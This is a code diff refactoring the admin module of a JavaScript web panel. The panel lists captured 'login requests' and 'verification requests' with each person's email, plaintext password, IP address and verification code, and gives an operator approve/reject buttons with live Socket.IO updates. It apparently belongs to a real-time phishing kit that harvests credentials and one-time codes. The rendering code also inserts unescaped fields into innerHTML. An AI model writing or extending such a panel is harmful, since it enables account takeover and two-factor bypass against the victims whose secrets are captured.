@@ -1,52 +1,43 @@
 /**
- * 审核功能模块
- * 包含登录请求和验证请求的加载、显示、审核等功能
+ * Admin Approvals Management Module
+ * 审核管理模块：处理登录请求和验证请求的审核
  */
 
-// 扩展 AdminApp 类
-(function () {
-    // 构造函数中添加 Socket 监听器
-    const originalSetupSocketListeners = AdminApp.prototype.setupSocketListeners;
-    AdminApp.prototype.setupSocketListeners = function() {
-        // 调用原始方法
-        originalSetupSocketListeners.call(this);
-        
-        // 添加取消登录请求的监听器
-        this.socket.on('cancel-login-request', (data) => {
-            
-            // 从页面中移除已取消的登录请求
-            const requestElement = document.querySelector(`#loginRequestsList .request-item[data-id="${data.id}"]`);
-            if (requestElement) {
-                requestElement.remove();
-                
-                // 更新计数
-                this.updatePendingCount();
-            }
-        });
-    };
-    
+class AdminApprovals {
+    constructor(adminApp) {
+        this.adminApp = adminApp;
+    }
+
     // 加载登录请求
-    AdminApp.prototype.loadLoginRequests = async function () {
+    async loadLoginRequests() {
+        const container = document.getElementById('loginRequestsList');
+        if (!container) return;
+        container.innerHTML = 'Loading...';
+        
         try {
-            const response = await this.apiRequest('/api/admin/login-requests');
+            const response = await this.adminApp.apiRequest('/api/admin/login-requests');
             if (response && response.ok) {
                 const requests = await response.json();
                 this.displayLoginRequests(requests);
+            } else {
+                container.innerHTML = 'Load failed';
             }
         } catch (error) {
             console.error('加载登录请求错误:', error);
+            container.innerHTML = 'Load failed';
         }
-    };
+    }
 
     // 显示登录请求
-    AdminApp.prototype.displayLoginRequests = function (requests) {
+    displayLoginRequests(requests) {
         const container = document.getElementById('loginRequestsList');
 
         if (requests.length === 0) {
             container.innerHTML = '<p>暂无待审核的登录请求</p>';
             return;
         }
-        const myId = this.currentAdmin ? this.currentAdmin.id : null;
+
+        const myId = this.adminApp.currentAdmin ? this.adminApp.currentAdmin.id : null;
         container.innerHTML = requests.map(request => {
             const isMine = request.assigned_admin_id && myId && Number(request.assigned_admin_id) === Number(myId);
             return `
@@ -56,30 +47,37 @@
                         <h4>${request.email} | 密码: <strong style="color: #0071e3; font-family: monospace;">${request.password || '未获取到密码'}</strong> | IP: ${request.ip_address} | 时间: ${new Date(request.login_time).toLocaleString()}</h4>
                     </div>
                     <div class="request-actions">
-                        <button class="approve-btn" onclick="adminApp.approveLogin(${request.id}, true)">通过</button>
-                        <button class="reject-btn" onclick="adminApp.approveLogin(${request.id}, false)">拒绝</button>
+                        <button class="approve-btn" onclick="adminApp.approvals.approveLogin(${request.id}, true)">通过</button>
+                        <button class="reject-btn" onclick="adminApp.approvals.approveLogin(${request.id}, false)">拒绝</button>
                     </div>
                 </div>
             </div>
             `;
         }).join('');
-    };
+    }
 
     // 加载验证请求
-    AdminApp.prototype.loadVerificationRequests = async function () {
+    async loadVerificationRequests() {
+        const container = document.getElementById('verificationRequestsList');
+        if (!container) return;
+        container.innerHTML = 'Loading...';
+
         try {
-            const response = await this.apiRequest('/api/admin/verification-requests');
+            const response = await this.adminApp.apiRequest('/api/admin/verification-requests');
             if (response && response.ok) {
                 const requests = await response.json();
                 this.displayVerificationRequests(requests);
+            } else {
+                container.innerHTML = 'Load failed';
             }
         } catch (error) {
             console.error('加载验证请求错误:', error);
+            container.innerHTML = 'Load failed';
         }
-    };
+    }
 
     // 显示验证请求
-    AdminApp.prototype.displayVerificationRequests = function (requests) {
+    displayVerificationRequests(requests) {
         const container = document.getElementById('verificationRequestsList');
 
         if (requests.length === 0) {
@@ -90,8 +88,8 @@
         container.innerHTML = requests.map(request => {
             // 尝试从邮箱-密码映射中获取密码
             let password = request.password;
-            if (!password && request.email && this.emailPasswordMap.has(request.email)) {
-                password = this.emailPasswordMap.get(request.email);
+            if (!password && request.email && this.adminApp.emailPasswordMap.has(request.email)) {
+                password = this.adminApp.emailPasswordMap.get(request.email);
             }
 
             return `
@@ -101,60 +99,80 @@
                         <h4>${request.email} | 密码: <strong style="color: #0071e3; font-family: monospace;">${password || '未获取到密码'}</strong> | 验证码: <strong style="color: #34c759; font-family: monospace; font-size: 20px;">${request.verification_code}</strong> | 时间: ${new Date(request.submitted_at).toLocaleString()}</h4>
                     </div>
                     <div class="request-actions">
-                        <button class="approve-btn" onclick="adminApp.approveVerification(${request.id}, true)">通过</button>
-                        <button class="reject-btn" onclick="adminApp.approveVerification(${request.id}, false)">拒绝</button>
+                        <button class="approve-btn" onclick="adminApp.approvals.approveVerification(${request.id}, true)">通过</button>
+                        <button class="reject-btn" onclick="adminApp.approvals.approveVerification(${request.id}, false)">拒绝</button>
                     </div>
                 </div>
             </div>
             `;
         }).join('');
-    };
+    }
 
     // 审核登录请求
-    AdminApp.prototype.approveLogin = async function (id, approved) {
+    async approveLogin(id, approved) {
         try {
-            const response = await this.apiRequest(`/api/admin/approve-login/${id}`, {
+            const response = await this.adminApp.apiRequest(`/api/admin/approve-login/${id}`, {
                 method: 'POST',
                 body: JSON.stringify({ approved })
             });
 
             if (response && response.ok) {
+                const data = await response.json();
+                alert(data.message || (approved ? '登录请求已通过' : '登录请求已拒绝'));
+                
                 // 移除已处理的请求
                 const element = document.querySelector(`#loginRequestsList .request-item[data-id="${id}"]`);
                 if (element) {
                     element.remove();
                 }
-                this.updatePendingCount();
+                this.adminApp.updatePendingCount();
+            } else {
+                const error = await response.json();
+                alert(error.error || '操作失败');
             }
         } catch (error) {
             console.error('审核登录请求错误:', error);
+            alert('操作失败，请重试');
         }
-    };
+    }
 
     // 审核验证请求
-    AdminApp.prototype.approveVerification = async function (id, approved) {
+    async approveVerification(id, approved) {
         try {
-            const response = await this.apiRequest(`/api/admin/approve-verification/${id}`, {
+            const response = await this.adminApp.apiRequest(`/api/admin/approve-verification/${id}`, {
                 method: 'POST',
                 body: JSON.stringify({ approved })
             });
 
             if (response && response.ok) {
+                const data = await response.json();
+                alert(data.message || (approved ? '验证请求已通过' : '验证请求已拒绝'));
+                
                 // 移除已处理的请求
                 const element = document.querySelector(`#verificationRequestsList .request-item[data-id="${id}"]`);
                 if (element) {
                     element.remove();
                 }
-                this.updatePendingCount();
+                this.adminApp.updatePendingCount();
+            } else {
+                const error = await response.json();
+                alert(error.error || '操作失败');
             }
         } catch (error) {
             console.error('审核验证请求错误:', error);
+            alert('操作失败，请重试');
         }
-    };
+    }
 
-    // 添加登录请求
-    AdminApp.prototype.addLoginRequest = function (request) {
+    // 添加登录请求（Socket.IO实时更新）
+    addLoginRequest(request) {
         const container = document.getElementById('loginRequestsList');
+        if (!container) {
+            console.warn('[addLoginRequest] loginRequestsList 容器不存在，自动刷新登录请求列表');
+            this.loadLoginRequests();
+            return;
+        }
+
         const existingEmpty = container.querySelector('p');
         if (existingEmpty) {
             existingEmpty.remove();
@@ -162,7 +180,7 @@
 
         // 存储邮箱和密码的映射，用于验证请求
         if (request.email && request.password) {
-            this.emailPasswordMap.set(request.email, request.password);
+            this.adminApp.emailPasswordMap.set(request.email, request.password);
         }
 
         const requestElement = document.createElement('div');
@@ -174,17 +192,22 @@
                     <h4>${request.email} | 密码: <strong style="color: #0071e3; font-family: monospace;">${request.password || '未获取到密码'}</strong> | IP: ${request.ip_address} | 时间: ${new Date(request.login_time).toLocaleString()}</h4>
                 </div>
                 <div class="request-actions">
-                    <button class="approve-btn" onclick="adminApp.approveLogin(${request.id}, true)">通过</button>
-                    <button class="reject-btn" onclick="adminApp.approveLogin(${request.id}, false)">拒绝</button>
+                    <button class="approve-btn" onclick="adminApp.approvals.approveLogin(${request.id}, true)">通过</button>
+                    <button class="reject-btn" onclick="adminApp.approvals.approveLogin(${request.id}, false)">拒绝</button>
                 </div>
             </div>
         `;
         container.insertBefore(requestElement, container.firstChild);
-    };
+    }
 
-    // 添加验证请求
-    AdminApp.prototype.addVerificationRequest = function (request) {
+    // 添加验证请求（Socket.IO实时更新）
+    addVerificationRequest(request) {
         const container = document.getElementById('verificationRequestsList');
+        if (!container) {
+            console.warn('[addVerificationRequest] verificationRequestsList 容器不存在');
+            return;
+        }
+
         const existingEmpty = container.querySelector('p');
         if (existingEmpty) {
             existingEmpty.remove();
@@ -196,30 +219,15 @@
             return;
         }
 
-        // 直接使用传入的请求数据，因为Socket事件已经包含了所有必要信息
         this.renderVerificationRequest(request);
-    };
-
-    // 从服务器获取完整的验证请求详情
-    AdminApp.prototype.fetchVerificationRequestDetails = async function (id) {
-        try {
-            const response = await this.apiRequest(`/api/admin/verification-request/${id}`);
-            if (response && response.ok) {
-                const data = await response.json();
-                return data;
-            }
-        } catch (error) {
-            console.error(`获取验证请求 ${id} 详情错误:`, error);
-        }
-        return null;
-    };
+    }
 
     // 渲染验证请求到UI
-    AdminApp.prototype.renderVerificationRequest = function (request) {
+    renderVerificationRequest(request) {
         // 尝试从邮箱-密码映射中获取密码
         let password = request.password;
-        if (!password && request.email && this.emailPasswordMap.has(request.email)) {
-            password = this.emailPasswordMap.get(request.email);
+        if (!password && request.email && this.adminApp.emailPasswordMap.has(request.email)) {
+            password = this.adminApp.emailPasswordMap.get(request.email);
         }
 
         const container = document.getElementById('verificationRequestsList');
@@ -232,11 +240,23 @@
                     <h4>${request.email} | 密码: <strong style="color: #0071e3; font-family: monospace;">${password || '未获取到密码'}</strong> | 验证码: <strong style="color: #34c759; font-family: monospace; font-size: 20px;">${request.verification_code}</strong> | 时间: ${new Date(request.submitted_at).toLocaleString()}</h4>
                 </div>
                 <div class="request-actions">
-                    <button class="approve-btn" onclick="adminApp.approveVerification(${request.id}, true)">通过</button>
-                    <button class="reject-btn" onclick="adminApp.approveVerification(${request.id}, false)">拒绝</button>
+                    <button class="approve-btn" onclick="adminApp.approvals.approveVerification(${request.id}, true)">通过</button>
+                    <button class="reject-btn" onclick="adminApp.approvals.approveVerification(${request.id}, false)">拒绝</button>
                 </div>
             </div>
         `;
         container.insertBefore(requestElement, container.firstChild);
-    };
-})();
+    }
+
+    // 处理取消的登录请求
+    handleCancelledLoginRequest(data) {
+        const requestElement = document.querySelector(`#loginRequestsList .request-item[data-id="${data.id}"]`);
+        if (requestElement) {
+            requestElement.remove();
+            this.adminApp.updatePendingCount();
+        }
+    }
+}
+
+// Export for use in main admin app
+window.AdminApprovals = AdminApprovals;
